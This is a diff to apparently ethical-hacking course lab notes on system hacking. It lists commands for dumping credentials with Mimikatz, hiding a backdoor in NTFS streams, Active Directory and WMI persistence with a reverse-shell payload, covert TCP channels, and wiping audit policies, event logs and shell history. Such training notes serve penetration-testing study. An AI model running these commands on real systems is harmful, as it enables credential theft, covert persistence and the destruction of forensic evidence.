@@ -458,10 +458,11 @@
   - `getsystem -t 1`
   - `use post/windows/manage/sticky_keys`
 #### Task 5: Escalate Privileges to Gather Hashdump using Mimikatz
-- `load kiwi`
-- `lsa_dump_sam`
-- `lsa_dump_secrets`
-- ` password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password`
+- meterpreter
+  - `load kiwi`
+  - `lsa_dump_sam`
+  - `lsa_dump_secrets`
+  - `password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password`
 
 ### Lab 3: Maintain Remote Access and Hide Malicious Activities
 #### Task 1: User System Monitoring and Surveillance using Power Spy
@@ -473,9 +474,69 @@
 - [NetVizor](https://www.netvizor.net)
 - [SoftActivity Monitor](https://www.softactivity.com)
 #### Task 3: Hide Files using NTFS Streams
-- ```
+- ```cmd
   c:\magic\calc.exe > c:\magic\readme.txt:calc.exe
   mklink backdoor.exe readme.txt:calc.exe
-   backdoor.exe
+  backdoor.exe
   ```
 #### Task 4: Hide Data using White Space Steganography
+- ```cmd
+  snow -C -m "My swiss bank account number is 45656684512263" -p "magic" readme.txt readme2.txt
+  snow -C -p "magic" readme2.txt
+  ```
+#### Task 5: Image Steganography using OpenStego and StegOnline
+- `OpenStego`
+- https://stegonline.georgeom.net/upload
+- [QuickStego](http://quickcrypto.com)
+- [SSuite Picsel](https://www.ssuitesoft.com)
+- [CryptaPix](https://www.briggsoft.com)
+- [gifshuffle](http://www.darkside.com.au)
+#### Task 6: Maintain Persistence by Abusing Boot or Logon Autostart Execution
+- `C:\\ProgramData\\Start Menu\\Programs\\Startup`
+#### Task 7: Maintain Domain Persistence by Exploiting Active Directory Objects
+- ```cmd
+  Import-Module ./powerview.psm1
+  Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Martin -Verbose -Rights All
+  Get-ObjectAcl -SamAccountName "Martin" -ResolveGUIDs
+  ```
+- `REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300`
+#### Task 8: Privilege Escalation and Maintain Persistence using WMI
+- ```sh
+  Import-Module ./WMI-Persistence.ps1
+  Install-Persistence -Trigger Startup -Payload [Reverseshell program]
+#### Task 9: Covert Channels using Covert_TCP
+- [covert.c](https://github.com/zaheercena/Covert-TCP-IP-Protocol)
+- ```sh
+  cc -o covert_tcp covert_tcp.c
+  ./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 9999 -dest_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt
+  ./covert_tcp -dest 10.10.1.9 -source 10.10.1.13 -source_port 8888 -dest_port 9999 -file /home/attacker/Desktop/Send/message.txt
+  ```
+
+### Lab 4: Clear Logs to Hide the Evidence of Compromise
+#### Task 1: View, Enable, and Clear Audit Policies using Auditpol
+- `auditpol /get /category:*`
+- `auditpol /set /category:"system","account logon" /success:enable /failure:enable`
+- `auditpol /clear /y`
+#### Task 2: Clear Windows Machine Logs using Various Utilities
+- ```cmd
+  `wevtutil el`
+  `wevtutil cl [log_name]`
+  ```
+- `cipher /w:[Drive or Folder or File Location`
+#### Task 3: Clear Linux Machine Logs using the BASH Shell
+- `export HISTSIZE=0`
+- `history -c`
+- `history -w`
+- `shred ~/.bash_history`
+#### Task 4: Hiding Artifacts in Windows and Linux Machines
+- ```cmd
+  attrib +h +s +r Test
+  attrib -s -h -r Test
+  ```
+- `touch .Secret.txt`
+#### Task 5: Clear Windows Machine Logs using CCleaner
+- `CCleaner`
+- [DBAN](https://dban.org)
+- [Privacy Eraser](https://www.cybertronsoft.com)
+- [Wipe](https://privacyroot.com)
+- [BleachBit](https://www.bleachbit.org)
